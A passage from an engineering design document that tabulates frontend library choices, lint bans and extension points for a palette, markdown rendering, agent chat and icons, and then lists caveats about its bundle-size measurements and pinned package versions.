| Palette           | Dialog + inline Autocomplete + `rank()` + `defineCommands`    | lint bans `cmdk`/`@radix-ui/*`; registry types                                    | skill: commands vs nav entries                                                           | ranking source, groups                 |
| Markdown          | react-markdown + remend + blockSplit; `//host`-safe transform | lint bans `streamdown`, `rehype-raw`; `contentTrust` required                     | skill "render agent text"                                                                | extra fences, remark plugins           |
| Agent chat        | `chatFor/closeChat` (10 lines), part registry                 | `agent-chat-owned` lint, `ai-sdk-major`                                           | skill states S3/S5b, throttle                                                            | transport, persistence, runtime choice |
| Icons             | `lucide-react` named imports, one stroke token                | `no-restricted-imports` other sets                                                | one line in the visual-language rule                                                     | custom glyphs via `icon` slot          |

## 8. Caveats (U)

- Scratch builds are single chunks of tiny cases; real apps add wrapper and app code. Treat section 2 as marginal cost of a dependency, section 6 as the gate shape.
- Compiler runs only on my fixture, not argo-scale code; weatherorb attribution of Mantine bytes to chunks is by content grep and matching sizes, not a source map.
- cooldown pinned versions are 1-3 days behind registry latest (charts 1.5.0, `ai` 7.0.166, `@ai-sdk/react` 4.0.170, tailwind 4.3.5, vite 8.3.7); re-run before pinning.
- Table runtime comparison to 2.x uses the dist of 2026-10-24, compiler off; the doc baselines are from a different environment.
- Not measured: Safari/iOS (Base UI Drawer issues in `ext-base-ui-primitives.md` section 3), React Native, SSR render cost, Brotli.
